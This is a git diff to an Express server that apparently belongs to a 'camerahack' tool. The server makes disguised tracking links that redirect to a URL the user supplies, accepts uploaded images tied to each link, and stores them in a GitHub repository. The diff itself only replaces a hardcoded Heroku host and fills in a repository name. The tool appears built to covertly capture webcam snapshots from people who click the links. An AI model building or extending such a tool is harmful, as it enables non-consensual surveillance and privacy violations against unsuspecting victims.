@@ -30,7 +30,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.post('/generate', (req, res) => {
     const uniqueId = uuidv4();
     const originalUrl = req.body.url;
-    const captureUrl = `https://camerahack-8c3cc7d0cd44.herokuapp.com/c/${uniqueId}?url=${encodeURIComponent(originalUrl)}`;
+    const captureUrl = `https://${req.headers.host}/c/${uniqueId}?url=${encodeURIComponent(originalUrl)}`;
 
     const newUrl = new Url({ url: originalUrl, uniqueId });
     newUrl.save().then(() => res.json({ captureUrl })).catch(err => res.status(500).json({ error: err.message }));
@@ -49,7 +49,7 @@ app.post('/upload/:id', async (req, res) => {
     
     // Save the image to GitHub
     const githubToken = process.env.GITHUB_TOKEN;
-    const repo = 'yourusername/yourrepo';  // Replace with your GitHub username and repository name
+    const repo = 'usmanneo/url-capture';
     const filePath = `uploads/${id}.png`;
     const message = `Upload image for ${id}`;
     const content = imageBuffer.toString('base64');
@@ -85,7 +85,7 @@ app.get('/image/:id', async (req, res) => {
         const url = await Url.findOne({ uniqueId: id });
         if (url && url.screenshot) {
             const githubToken = process.env.GITHUB_TOKEN;
-            const repo = 'yourusername/yourrepo';  // Replace with your GitHub username and repository name
+            const repo = 'usmanneo/url-capture';
             const filePath = `uploads/${id}.png`;
 
             const response = await fetch(`https://api.github.com/repos/${repo}/contents/${filePath}`, {
